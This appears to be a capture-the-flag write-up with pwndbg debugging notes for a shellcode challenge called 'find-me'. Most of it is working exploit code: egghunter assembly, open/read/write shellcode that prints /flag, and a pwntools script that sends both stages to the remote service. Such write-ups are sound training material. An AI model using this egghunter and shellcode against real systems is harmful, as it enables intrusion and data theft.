* design egg: b"\x90" * 8 (**nopsled**)
* debug egghunter make sure it can do hunter stuff by using pwndbg

```
context.terminal = ['tmux', 'splitw', '-h']
p = process('./find-me')
gdb.attach(p, gdbscript='''
b *0x4017d3  #call rax(egghunter)
c
''')
```

* egghunter itself

```
# search from rax(egghunter), set rax to rcx, coz rax maybe has some special task so use rcx which is free currently
mov rcx, rax

# logic quite simple, code as the comment
skip:
    inc rcx
    jmp search
search:
    cmp dword ptr [rcx], 0x90909090
    jne skip
    
    cmp dword ptr [rcx + 4], 0x90909090
    jne skip
    
    jmp rcx
```
* another life saver: **find start_addr, end_addr, egg** in pwndgb, try to figure out if egg has been injected

```
pwndbg> lis or vmap
pwndbg> find start_addr, end_addr, egg
```

* shellcode **nothing** special

```
payload = egg + shellcode(cat /flag)

```

* whole script

```
from pwn import *

context.arch = 'amd64'

p = remote('lol', 20709)

# context.terminal = ['tmux', 'splitw', '-h']
# p = process('./find-me')
# gdb.attach(p, gdbscript='''
#     b *0x4017d3
#     c
# ''')

shellcode = asm(f'''
   XOR RAX, RAX
   MOV RAX, 0x67616C662F
   PUSH RAX
   MOV RDI, RSP


   XOR RSI, RSI
   XOR RDX, RDX
   MOV RAX, 2
   SYSCALL

   MOV RDI, RAX
   MOV RSI, RSP
   MOV RDX, 200
   XOR RAX, RAX
   SYSCALL

   MOV RDI, 1
   MOV RSI, RSP
   MOV RDX, 200
   MOV RAX, 1
   SYSCALL

   XOR RDI, RDI
   MOV RAX, 60
   SYSCALL
''')

egg = b"\x90" * 4

egghunter = asm(f'''
mov rcx, rax
skip:
    inc rcx
    jmp search
search:
    cmp dword ptr [rcx], 0x90909090
    jne skip
    
    cmp dword ptr [rcx + 4], 0x90909090
    jne skip
    
    jmp rcx
''')

payload = egg + egg + shellcode

p.recvuntil(b'enter your smallbuf shellcode').decode('utf-8').strip()
p.sendline(egghunter)

p.recvuntil(b'enter your bigbuf shellcode:').decode('utf-8').strip()
p.sendline(payload)

p.interactive()

```
